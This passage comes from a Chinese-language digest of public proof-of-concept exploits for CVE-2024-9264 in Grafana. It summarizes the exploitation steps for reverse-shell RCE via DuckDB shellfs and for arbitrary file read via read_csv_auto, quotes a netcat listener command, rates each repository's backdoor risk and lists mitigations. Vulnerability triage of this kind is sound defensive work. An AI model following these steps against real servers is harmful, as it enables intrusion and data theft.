5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

